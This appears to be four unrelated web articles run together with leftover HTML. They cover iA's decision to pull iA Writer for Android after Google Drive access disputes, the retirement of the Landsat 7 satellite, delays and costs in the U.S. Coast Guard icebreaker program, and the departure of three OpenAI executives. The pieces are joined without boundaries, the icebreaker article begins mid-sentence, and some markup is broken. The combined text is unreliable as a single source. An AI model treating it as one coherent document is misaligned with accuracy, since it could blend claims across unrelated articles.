<div id="readability-page-1" class="page"><div>
<p>After seven years of trying, the most recent struggle with Google proved that we need to change course on our adventure in the Android galaxy.</p>
<p>A couple of months ago, Google changed its API policy and revoked iA Writer’s access to Google Drive on Android. By freezing up Android’s main storage option, our app was frozen in carbonite. It still lived but we couldn’t move forward before resolving it.</p>
<p>In order to allow our users to access their Google Drive on their phones we had to rewrite privacy statements, update documents, and pass a series of security checks, all while facing a barrage of new, ever-shifting requirements.</p>
<figure>
<img decoding="async" src="https://ia.net/wp-content/uploads/2024/09/february24b-1.png" alt="">
<figcaption><strong>April:</strong> Another update. Google sends those almost weekly. Every time you need to go through a stack of links and things. Sometimes you end up in a forum with a group of desperate devs talking about quitting Android.</figcaption>
</figure>
<figure>
<img decoding="async" src="https://ia.net/wp-content/uploads/2024/09/verify-now.png" alt="">
<figcaption><strong>Warning:</strong> Five months and 55 updates later. It can’t be too far now. Let’s make sure we verify everything as expected. Then send the documents and the passport scan. Then we’ll be good. Right?</figcaption>
</figure>
<p>By September, we thought we had honored our side of the new agreement. But on the very day we expected to get our access back, Google altered the deal.</p>
<h2>“I’ve altered the deal. Pray that I don’t alter it any further.”</h2>
<p>We were told that read-only access to Google Drive would suit our writing app better than the desired read/write access. That’s right—read-only for a writing app.</p>
<figure>
<img decoding="async" src="https://ia.net/wp-content/uploads/2024/09/update.png" alt="">
<figcaption><strong>Getting closer:</strong> Ah, not quite. After a series of updates, following exactly Google’s playbook they still want more privacy policy changes. But then, *then*, our customers get Google Drive back. Right… Right?</figcaption>
</figure>
<figure>
<img decoding="async" src="https://ia.net/wp-content/uploads/2024/09/important.png" alt="">
<figcaption><strong>No:</strong> “You don’t really need Google Drive write access, for your writing app, do you?”</figcaption>
</figure>
<h2>“Perhaps you think that you were treated unfairly?”</h2>
<p>When we pointed out that this was not what we had, or what our users wanted, Google seemed to alter the deal yet again. In order to get our users full access to <em>their</em> Google Drive on <em>their</em> devices, we now needed to pass a yearly CASA (Cloud Application Security Assessment) audit. This requires hiring a third-party vendor like KPMG.</p>
<figure>
<img decoding="async" src="https://ia.net/wp-content/uploads/2024/09/mycasa-su-casa.png" alt="">
<figcaption><strong>Warning:</strong> Google has altered the deal.</figcaption>
</figure>
<figure>
<img decoding="async" src="https://ia.net/wp-content/uploads/2024/09/don-t-do-this.png" alt="">
<figcaption><strong>Warning:</strong> Pray that they don’t alter it any further…</figcaption>
</figure>
<p>The cost, including all internal hours, amounts to about one to two months of revenue that we would have to pay to one of Google’s corporate amigos. An indie company handing over a month’s worth of revenue to a “Big Four” firm like KPMG for a pretty much meaningless scan. And, of course, this would be a recurring annual expense. More cash for Google’s partners, while small developers like us foot the bill for Android’s deeply ingrained security shortcomings.<sup id="fnref-27202-scam"><a href="#fn-27202-scam" rel="footnote">1</a></sup></p>
<p>As we… googled… our new situation, it became clear this wasn’t just our battle—developers everywhere were facing similar bureaucratic entanglements, all designed to benefit Google’s partners while squeezing the life out of smaller companies.</p>
<blockquote>
<p>I just finally completed and passed the assessment. Overall it took me about 60-80 hours of my time, and the process itself spanned 3-4 months, with 25-30 back and forth requests of varying complexity. It was awful, and if it’s not streamlined next year, I’ll be dropping this permission from my app and going another route.<sup id="fnref-27202-reddit"><a href="#fn-27202-reddit" rel="footnote">2</a></sup></p>
</blockquote>
<p>So it’s normal. Seems like we had to bite the bullet. After all, we have been doing this for seven years. We have tens of thousands of users. We invested hundreds of thousands to make this works, and so it looks like…</p>
<h2>“We shall double our efforts!”</h2>
<p>This battle to give our customers access to their Google Drive is only the latest in a series of clashes we’ve had with the empire. Developing on Android is a daily worsening struggle with red tape, inconsistent device performance, app store search performance gaming<sup id="fnref-27202-gaming"><a href="#fn-27202-gaming" rel="footnote">3</a></sup>, and rampant piracy.<sup id="fnref-27202-piracy"><a href="#fn-27202-piracy" rel="footnote">4</a></sup></p>
<p>Every time we think we’ve overcome one hurdle, another two pop up. It’s an exhausting process that saps our resources, delays updates, and damages our reputation. Meanwhile, the negative reviews keep piling up for problems that are out of our control. That’s not the only problem.</p>
<p>There are certain devices that cause trouble. To fix the bugs you need to buy the device. Customers demand that. And often we did. Below you can see the 12,000 devices that were using iA Writer in 2017:</p>
<p><img decoding="async" src="https://ia.net/wp-content/uploads/2017/09/iA-Writer-Android-Devices-Galaxy.png"></p><p>Developing for Android you navigate an asteroid field. Bugs surface across thousands of device types, Android versions, and flavors—One UI, MIUI, OxygenOS, Pixel Experience, you name it.</p>
<p>And before anyone says this is the price of an “open” OS—well, we don’t have this problem on Windows.<sup id="fnref-27202-flavor"><a href="#fn-27202-flavor" rel="footnote">5</a></sup></p>
<h2>“Put him in!”</h2>
<p>We could just comply—we could pay KPMG, surrender more of our revenue, and dig ourselves deeper into the red. And then accept the next forced change. And the next one. We could try to write our own framework for payment to avoid piracy. But why would we when no one wants to pay for it? And then what? Where does it end? Hiring someone to game our app reviews?</p>
<p>As long as we sell to Android end consumers, the economics of continuing development on Android is an ever-tightening Force Choke. Bit by bit the control over our app’s functionality, quality, or finances are being taken away from us. If we continue down the current path we damage our relationship with users, taint our reputation, lose money, nerves, and time.</p>
<p>So, as of today, we’re not just accepting our frozen-in-carbonite fate. We’re embracing it. We’re going to take the app offline. We know this decision will disappoint our loyal Android users, and we share your frustration. After seven years of continuous investment, this is way more painful for us than it is for any of you.</p>
<p>It’s important to understand why many developers choose not to engage with the Empire. You can’t win that battle. They do as they please. Existing users will keep their access, and we’ll push critical updates when necessary—if the empire allows it. But new features are off the table for now. Support will be friendly as always, but we have to be pragmatic.</p>
<h2>“What if he doesn’t survive? He’s worth a lot to me!”</h2>
<p>iA Writer for Android might return in the future—perhaps in a different chapter of this saga, where it can develop in a more controlled environment.</p>
<p>We are working towards a setup where organizations can pay us directly for all our software.<sup id="fnref-27202-directly"><a href="#fn-27202-directly" rel="footnote">6</a></sup> In a B2B setup, the Android hardware ecosystem may be economical and manageable, and then we can go back to sponsoring single-license users and their unruly pirate friends. Until that day comes, iA Writer for Android will remain frozen in carbonite, waiting for the right time to reawaken.</p>
<p>In the meantime, we’re focusing on projects that drive our business forward: finalizing a major Windows 11 update, enhancing iA Writer for Mac, iOS, and iPadOS, preparing to launch Web sharing for iA Presenter, and releasing the iOS/iPadOS app.</p>

<div id="readability-page-1" class="page"><div><p>A joint mission between the U.S. Geological Survey (USGS) and NASA, <a href="https://www.usgs.gov/landsat-missions/landsat-7">Landsat 7</a> was initially designed for a five-year mission. Beating the odds, the satellite observed the Earth for a quarter-century, delivering invaluable scientific data for the benefit of all humanity. &nbsp;</p>
<figure role="group">
  <div>

<p>Landsat 7 captured one of its final images on May 28 over Las Vegas, Nevada.&nbsp;</p>
<figure role="group">
  <div>
    
  

    <figcaption>These Landsat 7 images showcase the first and last captures of the Las Vegas area, taken on July 4, 1999, and May 28, 2024, respectively. The images highlight the city, the surrounding desert landscape, and Lake Mead, using shortwave infrared (SWIR), near-infrared (NIR), and red bands to emphasize differences in vegetation, water, and urban growth. The final image, marking the satellite’s 25th anniversary, stands as a tribute to Landsat 7's quarter-century legacy of Earth observation.</figcaption>
  </div>
</figure>

<p>Since its launch on April 15, 1999, Landsat 7 provided a wealth of imagery, enabling scientists, policymakers, and conservationists to track changes in land use, natural disasters, and environmental degradation with unprecedented accuracy.&nbsp;</p>
<figure role="group">
  <div>
    
  

    <figcaption>Landsat 7 was successfully launched on April 15, 1999, from the Western Test Range of Vandenberg Air Force Base, California, on a Delta II expendable launch vehicle.</figcaption>
  </div>
</figure>

<p>“Landsat 7 data have been pivotal in documenting environmental changes such as natural disasters, deforestation, and urban growth over its 25 years,” said&nbsp;<strong>David Applegate, USGS Director</strong>. “Notably capturing significant events like Hurricane Katrina in 2005, the Haiti earthquake in 2010, the Australian bushfires in 2019 - 2020, the dramatic growth of cities worldwide and more through its long-standing mission.”&nbsp;</p>
<figure role="group">
  <div>
    
  

    <figcaption>This true-color image was taken by the Enhanced Thematic Mapper Plus (ETM+) sensor aboard the Landsat 7 satellite on September 12, 2001, at roughly 11:30 a.m. Eastern Daylight Savings Time. A day after the attack, smoke continues to billow out of the collapsed Twin Towers.</figcaption>

</figure>
<p>The data have proven to be a useful asset as the foundation for countless studies, enhancing our understanding of agriculture, water resources, and wildland fires. By providing consistent data every eight days in conjunction with Landsat 5 until 2012, Landsat 7 improved our ability to monitor seasonal changes. Thanks to operational enhancements, Landsat 7 nearly doubled the daily data collected, from 250 to 450 scenes.</p>

<p><strong>The Land Imaging Satellite that Could</strong></p>
<p>When it was launched, Landsat 7 featured the Enhanced Thematic Mapper Plus (ETM+) sensor, which built upon and improved the capabilities of its predecessors, the Thematic Mapper (TM) sensor used on Landsat 4 and Landsat 5. As an eight-band, multispectral scanning radiometer, the ETM+ offered improvements over previous sensor technology including a 15-meter spatial resolution panchromatic band and 60-meter resolution thermal band.&nbsp;</p>
<figure role="group">
  <div>
    
  

    <figcaption>This color infrared image of Southeast South Dakota was advertised as the first image acquired by <a href="https://www.usgs.gov/landsat-missions/landsat-7">Landsat 7</a>'s Enhanced Thematic Mapper Plus (ETM+) sensor on April 18, 1999. The Missouri River flows from the middle left of the image, to the lower right, where the Fort Randall Dam creates Lake Francis Case.&nbsp;</figcaption>
  </div>
</figure>

<p>However, four years after Landsat 7’s launch, a piece of equipment known as the Scan Line Corrector failed on the ETM+, impacting the satellite's ability to capture complete images of the Earth's surface. This led to “striping,” or gaps in its data. Despite the setback, 78 percent of a scene’s pixels are still usable and are considered some of the world’s most geometrically and radiometrically accurate civilian satellite data.</p>
<figure role="group">

<p>Landsat 7 went on to produce images for five times its expected operational lifespan.</p>

<figure role="group">
  <div>
    
  

    <figcaption>For 25 years, the Landsat 7 satellite acquired millions of images of Earth that supported studies of how land is used and how it has changed across urban, agriculture, forest, snow and ice-covered areas around the globe, as well as natural and manmade disasters. As the mission comes to a close, we look back at the magnitude and impact that Landsat 7 imagery brought to scientists and those interested in studying the Earth's landmasses: Over 5,000 scientific publications in 21 languages across 143 different countries152 of the articles have received a news, blog, and/or patent mention1,414 policy documents across 54 countries that cite 749 journal articles</figcaption>

  </div>
</figure>
<p>To allow Landsat 9, launched in September 2021, to share the same orbital position as Landsat 8, the USGS lowered Landsat 7’s orbit. Even at its lower altitude, Landsat 7 continued to collect valuable data. However, being lowered caused Landsat 7 to increasingly drift within its orbit. The drift exposed it to periods of full sunlight and earlier imaging times, impacting battery maintenance, imaging opportunities, and processing of reliable science data. As a result, the USGS decided to end imaging from the aging satellite.&nbsp;</p>

<p><strong>The Landsat Mission Continues</strong></p>
<p>With the end of Landsat 7’s role in the Landsat science mission and the advancing age of Landsat 8, launched in 2013, attention is now directed toward the Landsat Next mission as a critical next step to ensure continuity of Landsat’s unique global Earth science mission. The USGS is currently focused on ensuring the flow of data remains uninterrupted and that the quality of information keeps pace with evolving technological and environmental demands.</p>

<p>The newest mission, known as Landsat Next, promises enhanced capabilities over its predecessors, including improved spatial resolution, increased spectral bands, and faster revisit times. These advancements are essential for more detailed and frequent monitoring of Earth's changing landscapes and for supporting critical decisions in climate resiliency, disaster response, agriculture and water management.&nbsp;</p>
<figure role="group">

<p>Landsat Next is designed not only to continue the legacy of Landsat, but also to innovate and adapt to the pressing challenges of the 21st century, ensuring that scientists, policymakers, industry, and the public have access to the information needed to better monitor and sustainably manage our ever-changing planet.</p>

In 2014, Xi Jinping stated that China planned on joining the ranks of “the great polar powers,” and in 2023 Russia and China sent a naval force to </span><a href="https://archive.ph/OGdzP" rel="">patrol near the coast of Alaska</a><span>. By shipping goods through shorter, previously inaccessible Arctic Ocean routes, China could potentially reduce its ocean-based transportation costs by 40%, saving hundreds of billions of dollars per year.</span></p><p><span>Because polar bodies of water are often covered in ice, accessing these regions by ship requires specially designed ships which can break up the ice and create a path for other ships to follow. The need for icebreaking vessels will remain even as climate change reduces the extent of sea ice: paradoxically, as new polar routes become accessible and sea ice becomes more mobile, the demand for icebreakers is likely to increase. Russia has an aging fleet of more than </span><a href="https://www.ponarseurasia.org/russias-icebreakers-north-sea-route-and-invasion-of-ukraine/" rel="">40 icebreakers</a><span>, with several under construction. China has somewhere between 5 and 7 </span><a href="https://en.wikipedia.org/wiki/List_of_icebreakers#China" rel="">icebreakers</a><span> (depending on exactly how you define “icebreaker”), with more </span><a href="https://maritime-executive.com/article/china-unveils-its-fourth-research-icebreaker" rel="">under construction</a><span>.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-149401395" href="https://www.construction-physics.com/p/why-the-us-cant-build-icebreaking#footnote-1-149401395" target="_self" rel="">1</a></span></p><p><span>The U.S., on the other hand, has allowed its icebreaking capabilities to wither. The Coast Guard has handled all U.S. icebreaking since 1966, and estimates that it needs 8-9 polar icebreakers (4-5 heavy and 4-5 medium) to fulfill its needs. But it currently has only two: the heavy icebreaker </span><em><a href="https://en.wikipedia.org/wiki/USCGC_Polar_Star" rel="">Polar Star</a></em><span>, and the medium icebreaker </span><em><a href="https://en.wikipedia.org/wiki/USCGC_Healy" rel="">Healy</a></em><span>. The U.S. hasn’t built a heavy icebreaker </span><a href="https://sixtydegreesnorth.substack.com/p/uscgs-polar-icebreaker-program-if" rel="">since 1976</a><span>. In fact, </span><a href="https://www.cbo.gov/system/files/2024-08/60170-Polar-Security-Cutter.pdf" rel="">no existing U.S. shipyard</a><span> has built a heavy polar icebreaker since before 1970. A </span><a href="https://nap.nationalacademies.org/catalog/24834/acquisition-and-operation-of-polar-icebreakers-fulfilling-the-nations-needs" rel="">2017 National Academies</a><span> report stated that “The nation is ill-equipped to protect its interests and maintain leadership in these regions and has fallen behind other Arctic nations, which have mobilized to expand their access to ice-covered regions.”</span></p><p><span>And while the U.S. is trying to remedy this with a </span><a href="https://www.cbo.gov/system/files/2024-08/60170-Polar-Security-Cutter.pdf" rel="">Polar Security Cutter program</a><span> to build a series of new heavy polar icebreakers (to be followed by a series of medium icebreakers), the program is going poorly. When the contract was first awarded in 2019, the plan was to have the first icebreaker </span><a href="https://sixtydegreesnorth.substack.com/p/uscgs-polar-icebreaker-program-if" rel="">completed by 2024</a><span>. But as of July this year, the design of the </span><a href="https://sixtydegreesnorth.substack.com/p/us-coast-guard-icebreaker-update" rel="">ship was still incomplete</a><span>. If and when the ships are completed (currently 2029 for the first vessel at the earliest), they are expected to cost $1.7-1.9 </span><a href="https://www.cbo.gov/system/files/2024-08/60170-Polar-Security-Cutter.pdf" rel="">billion apiece</a><span>, roughly four to five times what a comparable ship would cost to </span><a href="https://sixtydegreesnorth.substack.com/p/the-silicon-valley-of-icebreaking" rel="">build</a><span> elsewhere. Icebreakers, then, are another unfortunate example of the costs inflicted by binding national interests to an inefficient shipbuilding industry.</span></p><p><span>An icebreaker is exactly what it sounds like; a ship designed to break up ice, either to create a passage for itself or to create a channel for other ships to follow. A ship might be designed primarily for icebreaking (like the </span><em><a href="https://en.wikipedia.org/wiki/USCGC_Polar_Star" rel="">Polar Star</a></em><span>) or designed for icebreaking and other duties. The French </span><em><a href="https://sixtydegreesnorth.substack.com/p/a-successful-commercial-icebreaker" rel="">Le Commandant Charcot</a></em><span> is a cruise ship with icebreaking capabilities. Modern icebreakers </span><a href="https://en.wikipedia.org/wiki/Polar_Class" rel="">are rated</a><span> based on their ability to break through ice and operate in various ice conditions. Higher-rated icebreakers can continuously break through ice nearly 10 feet thick, and can ram through even thicker ice.</span></p><p><span>Breaking ice requires a host of specific design features. Traditional icebreakers pair high-powered engines with specially shaped hulls designed to create downward pressure over the top of the ice, breaking it apart under high tensile forces, as ice is weak in tension. For particularly thick ice, or ice ridges, the entire front of the icebreaker may be driven up onto the ice, breaking the ice beneath it. The hull and ship structure must be strong enough to withstand the impact of ice, and a heavily reinforced “</span><a href="https://www.marineinsight.com/naval-architecture/design-and-construction-of-ice-class-ships-part-2/" rel="">ice-belt</a><span>,” often made of special high-strength steel, is installed near the level of the waterline. Things like </span><a href="https://nrc.canada.ca/en/stories/breaking-ice-ease" rel="">air bubbler systems</a><span> (which blow bubbles of air up around the ship from beneath the water) and </span><a href="https://www.international-marine.com/en/products/intershield-163-inerta-160" rel="">low-friction paint</a><span> reduce friction as the ship forces its way through the ice. Traditional icebreaking hull shapes, while well suited to breaking through ice, perform poorly in open ocean operations; the </span><em>Polar Star</em><span> has been dubbed “</span><a href="https://www.kqed.org/science/23053/life-aboard-a-polar-roller-americas-last-heavy-icebreaker" rel="">The Polar Roller</a><span>” due to its tendency to roll constantly.</span></p><p><span>The development of rotatable “azimuth” thrusters in the late 1980s, sometimes known as </span><a href="https://en.wikipedia.org/wiki/Azipod" rel="">azipods</a><span>, changed the mechanics of icebreaking. Icebreaking ships with azimuth thrusters are often designed to break ice by moving backwards, using the propellers to break ice from below and to flush the hull with water to reduce friction. Not only does this reduce the power required to break ice, but it allows for the front (bow) of the ship to be designed for better open water performance. </span><a href="https://en.wikipedia.org/wiki/Baltika_(icebreaker)" rel="">Some modern icebreakers</a><span> are designed to use azimuth thrusters to move forward at an oblique angle to create an especially wide channel.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png" width="600" height="399" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:399,&quot;width&quot;:600,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2c5774f3-98f4-4c1e-b9ec-769ef0a50e77_600x399.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Azimuth thrusters.</figcaption></figure></div><p><span>The specialized design requirements and equipment make icebreaker ship design and construction a specialized field of expertise.

During a major refurbishment of the </span><em>Polar Star</em><span> in 2010, the head of the Coast Guard stated that “it’s a little uncertain to me how many more years we can get out of her in her current condition.” That was 14 years ago; today the </span><em>Polar Star</em><span> remains America’s only heavy icebreaker, and the only U.S. ship that can clear a path through the ice to resupply McMurdo Station.</span></p><p><span>To replace its aging icebreakers with a new, larger fleet of ships, in 2013 the Coast Guard initiated its </span><a href="https://en.wikipedia.org/wiki/Polar_Security_Cutter_program" rel="">Polar Security Cutter program</a><span> to construct a series of new heavy icebreakers. The Coast Guard solicited bids in 2017, and the first contract was awarded in 2019, to VT Halter Marine, with an expected delivery date of 2024 for the first ship. But the program has gone poorly. While most icebreakers are custom designed using proven concepts, the team of </span><a href="https://navalarchitects.us/" rel="">TAI</a><span> and Halter Marine used a German icebreaker that has yet to be built as a ‘parent design’, intending to modify it for Coast Guard needs. After five years, this modification still isn’t complete; as of July 2024 the design was only 59% done, and construction has not yet started. While the original delivery date for the first ship was 2024, that has now been pushed back to 2029.</span></p><p><span>In a report and testimony, the GAO </span><a href="https://sixtydegreesnorth.substack.com/p/uscgs-polar-icebreaker-program-if" rel="">described</a><span> some of the problems during the program:</span></p><ul><li><p><em>U.S.-based designers and shipbuilders generally lacked experience designing and building heavy polar icebreakers.</em></p></li><li><p><em>The ship design is complex, including that it used a specialized steel alloy that required technical study and development of new welding procedures before use.</em></p></li><li><p><em>The shipbuilder overestimated the extent to which it could leverage the original design and had to make significant design changes to meet government specifications, according to program officials. The shipbuilder also made some design errors, such as selecting the wrong height for the lowest deck of the ship, which required significant, late redesign to correct.</em></p></li><li><p><em>COVID-19 restrictions limited the extent to which the shipbuilder could collaborate and consult with its domestic and international partners.</em></p></li></ul><p><span>Notably, VT Halter Marine lost $256 million between 2017 and 2021, after which it was bought for a song (just $15 million) by </span><a href="https://news.usni.org/2022/11/14/bollinger-closes-15m-acquisition-of-halter-marine-new-name-bollinger-mississippi-shipbuilding" rel="">Bollinger</a><span>, which took over the icebreaker contracts.</span></p><p><span>Originally, the Polar Security Cutters were expected to cost $800-$900 million per ship ($1.1-$1.3 billion in 2024 dollars), but current cost estimates are closer to $1.7-1.9 billion, and given that construction hasn’t started yet, this is likely to rise. And it’s unclear if that 2029 date will be hit either. The </span><a href="https://www.gao.gov/assets/gao-23-105949.pdf" rel="">GAO report</a><span> notes that “the shipyard is completing, on average, approximately three percent of functional design and six percent of transitional design every six months. At that design completion rate, it would take the shipyard approximately eight years to complete functional design.”</span></p><p><span>By contrast, a Finnish shipyard can build a heavy icebreaker for just a few hundred million dollars, and deliver it within two years, instead of 10 or more. However, the Coast Guard opted not to pursue a foreign manufacturer, instead choosing a U.S. shipyard. The culprit here isn’t the Jones Act, but another protectionist shipbuilding law that requires Naval and Coast Guard ships to be built in U.S. shipyards. It’s possible to waive this requirement via </span><a href="https://sixtydegreesnorth.substack.com/p/yes-the-us-coast-guard-can-build" rel="">presidential authorization</a><span>, but there hasn’t appeared to be much interest in this. Waiving this requirement and allowing the Coast Guard to buy icebreakers from Finland would likely save over a billion dollars per ship, as well as years of construction time.</span></p><p><span>Barring acquiring Finnish icebreakers, the next best option for the U.S. icebreaker program would have been awarding the contract to a team that had icebreaker experience. Finnish shipbuilding firms previously assisted during the design and construction of the </span><em><a href="https://sixtydegreesnorth.substack.com/p/the-silicon-valley-of-icebreaking" rel="">Healy</a></em><span>. Of the three bids submitted for the Polar Security Cutter program, two were from U.S. shipyards partnered with European firms that had previously designed and built icebreakers. The winning bid from VT Halter was, bizarrely, the </span><a href="https://sixtydegreesnorth.substack.com/p/uscgs-polar-icebreaker-program-if" rel="">only bid without an experienced partner</a><span>.</span></p><p><span>The U.S. has made some gestures to try and improve its icebreaker construction with the </span><a href="https://www.whitehouse.gov/briefing-room/statements-releases/2024/07/11/biden-harris-administration-announces-new-polar-partnership-ice-pact-alongside-finland-and-canada/" rel="">ICE Pact</a><span>, a non-binding agreement to collaborate and share information on icebreaker design and construction. But experts </span><a href="https://sixtydegreesnorth.substack.com/p/ice-pact-update" rel="">appear skeptical</a><span> as to whether this will have much impact, as it’s predicated on attracting foreign orders for U.S.-built icebreakers that aren’t likely to materialize.</span></p><p><span>With icebreakers, we see a microcosm of </span><a href="https://www.construction-physics.com/p/why-cant-the-us-build-ships" rel="">the broader problems we looked at</a><span> in U.S. shipbuilding. Icebreakers are far more expensive to build (and take much longer to build) in the U.S. than in foreign shipyards, and it’s only a series of protectionist laws that drive any icebreaker construction here at all.&nbsp;</span></p><p><span>We also see the same cultural issues that we saw with American shipbuilding more broadly. There seems to be a lack of motivation to take maritime issues seriously or treat them as important. For decades, the U.S. has been willing to accept an undersized icebreaker fleet – complaints about insufficient icebreakers </span><a href="https://nap.nationalacademies.org/catalog/11753/polar-icebreakers-in-a-changing-world-an-assessment-of-us" rel="">date back to the 1980s</a><span>. There appears to be little interest in trying to ameliorate this by acquiring foreign icebreakers, even though that would be comparatively simple, far cheaper, and far faster. And the Coast Guard apparently did not think icebreakers were important enough to select a team for building them that had icebreaker experience, even though it’s a niche, specialized area of marine construction.</span></p><p><span>As a result, icebreaking can be added to the list of things like </span><a href="https://reason.org/commentary/the-foreign-dredge-act-increases-costs-and-slows-the-key-bridge-cleanup/" rel="">dredging</a><span> and </span><a href="https://www.cato.org/blog/jones-act-helps-sink-new-jersey-offshore-wind-project" rel="">offshore wind turbine </a><span>installation: areas that have been shackled to America’s inefficient shipbuilding industry and have inflicted costs on the country in the process.</span></p><p><em><span>Much of this information comes from Peter Rybski’s substack, </span><a href="https://sixtydegreesnorth.substack.com/" rel="">60 Degrees North</a><span>, which I highly recommend if you’re interested in learning more about icebreakers and icebreaker policy. Thanks to Peter for reading a draft of this. All errors are my own.</span></em></p><p><em><span>For those interested in reading more about icebreakers, and about shipbuilding, a recommended reading list is </span><a href="https://open.substack.com/pub/constructionphysics/p/shipbuilding-and-icebreakers-reading?r=23el8&amp;utm_campaign=post&amp;utm_medium=web" rel="">available here</a><span> for paid subscribers.</span></em></p></div></div>]]></description>

<div id="readability-page-1" class="page"><div id="body">
<p>Three key OpenAI staff members – CTO Mira Murati, Chief Research Officer Bob McGrew, and Research VP Barret Zoph – are leaving the ChatGPT maker.</p>
<p>Murati <a target="_blank" rel="nofollow" href="https://x.com/miramurati/status/1839025700009030027/photo/1">described</a> the decision as "difficult," but wrote that "this moment feels right." She said she is leaving "because I want to create the time and space to do my own exploration."</p>
<p>Murati was joined by McGrew, who <a target="_blank" rel="nofollow" href="https://x.com/bobmcgrewai/status/1839099787423134051">said</a>: "It is time for me to take a break." Regarding his departure, Zoph <a target="_blank" rel="nofollow" href="https://x.com/barret_zoph/status/1839095143397515452">stated</a>: "This is a personal decision based on how I want to evolve the next phase of my career."</p>

    

<p>Murati briefly served as OpenAI CEO during the <a target="_blank" href="https://www.theregister.com/2023/11/20/ex_openai_boss_sam_altman_to_join_microsoft/">firing and rehiring</a> of Sam Altman last year.</p>

        


        

<p>Altman <a target="_blank" rel="nofollow" href="https://x.com/sama/status/1839096160168063488">posted</a> a glowing tribute to the departing staffers and called Murati "instrumental to OpenAI's progress and growth the last 6.5 years." The OpenAI boss also insisted that the other departures were entirely coincidental and "decisions made independently of each other."</p>
<p>Jason Wong, Gartner analyst, told <i>The Register</i>: "It's clear with the departures of the co-founders, and high-profile engineering leaders, that OpenAI is being remade with Sam's vision. His manifesto and the shift to a for-profit entity also reinforces his vision for the business.</p>

        

<p>"This could have significant impact on OpenAI's partnership with Microsoft, which clearly stated they view OpenAI as a competitor. Microsoft has already started to downplay the importance of OpenAI models in their overall AI strategy. For enterprises, uncertainty is not good for business and key tech investments like generative AI. Other frontier models – especially more open ones – have caught up to OpenAI, which will further influence decisions to derisk by moving away from OpenAI or spread their risk using other models."</p>
<p>AI expert Dr Gary Marcus <a target="_blank" rel="nofollow" href="https://garymarcus.substack.com/p/openais-slow-motion-train-wreck">described</a> the events at OpenAI as a "slow-motion train wreck."</p>
<p>OpenAI co-founder Ilya Sutskever <a target="_blank" href="https://www.theregister.com/2024/05/15/openai_cofounder_ilya_sutskever_leaves/">quit earlier this year</a>. Another co-founder, Greg Brockman, <a target="_blank" rel="nofollow" href="https://x.com/gdb/status/1820644694264791459">announced</a> he would be taking a sabbatical until the end of the year, and now Murati is leaving.</p>

</ul>
<p>It's almost as if a person had asked ChatGPT to write a soap opera set in an absurdly overvalued AI company.</p>
<p>Murati's departure comes alongside <a target="_blank" rel="nofollow" href="https://www.reuters.com/technology/artificial-intelligence/openai-remove-non-profit-control-give-sam-altman-equity-sources-say-2024-09-25/">a Reuters report</a> citing sources saying OpenAI is working on a plan that will take control away from its non-profit board and instead restructure the business as a for-profit corporation.</p>

        

<p>Such a move could lead to Altman receiving equity in the for-profit company, making the timing of Murati's departure even more interesting. Other <a target="_blank" rel="nofollow" href="https://www.bloomberg.com/news/articles/2024-09-11/openai-fundraising-set-to-vault-startup-s-value-to-150-billion">reports</a> earlier in September put OpenAI's value at $150 billion as part of an impending funding round. Quite a jump from the <a target="_blank" href="https://www.theregister.com/2023/09/26/openai_90bn_valuation/">$90 billion figure</a> thrown around a year ago.</p>
